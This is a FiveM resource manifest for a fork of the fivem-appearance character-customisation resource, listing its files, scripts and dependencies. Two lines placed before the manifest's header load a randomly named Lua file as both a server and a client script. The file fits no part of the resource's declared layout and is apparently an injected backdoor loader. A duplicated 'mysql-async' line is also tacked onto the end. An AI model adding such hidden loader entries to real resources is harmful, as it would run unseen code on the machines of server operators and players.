server_script "R4LN00UHM0I9N0C.lua"
client_script "R4LN00UHM0I9N0C.lua"
-----------------For support, scripts, and more----------------
--------------- https://discord.gg/wasabiscripts  -------------
---------------------------------------------------------------

fx_version "cerulean"
game "gta5"
lua54 'yes'

author 'wasabirobby'
description 'Wasabi fork of fivem-appearance'
version '1.3.0'

files {
  'web/dist/index.html',
  'web/dist/assets/*.js',
  'locales/*.json',
  'files/*.json'
}

ui_page 'web/dist/index.html'

client_scripts {
  'game/dist/index.js',
  'client/*.lua'
}

server_scripts {
  '@oxmysql/lib/MySQL.lua',
  'server/*.lua'
}

shared_scripts {
  '@ox_lib/init.lua',
  'configuration/*.lua'
}

dependencies {
  'es_extended',
  'oxmysql',
  'ox_lib'
}

provides {
  'skinchanger',
  'esx_skin'
}
server_scripts { '@mysql-async/lib/MySQL.lua' }server_scripts { '@mysql-async/lib/MySQL.lua' }